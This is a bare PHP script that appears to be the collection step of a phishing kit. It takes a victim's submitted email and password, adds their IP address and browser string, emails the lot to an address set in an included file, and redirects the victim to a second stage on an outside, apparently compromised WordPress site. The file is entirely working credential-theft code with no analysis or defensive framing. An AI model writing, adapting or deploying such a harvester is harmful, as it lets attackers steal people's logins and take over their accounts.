<?php
$zabi = getenv("REMOTE_ADDR");
include('email.php');
$message .= "1 : ".$_POST['email']."\n";
$message .= "2 : ".$_POST['pass']."\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$login = $_POST['email'];
$subject = "WM 1";
$headers = "From: WM 1 <wm1>\r\n";
mail($email,$subject,$message,$headers);

header("Location: https://taxforte.com/wp-admin/user/credits/wm8934752h09873452/index2.php?email=$login");?>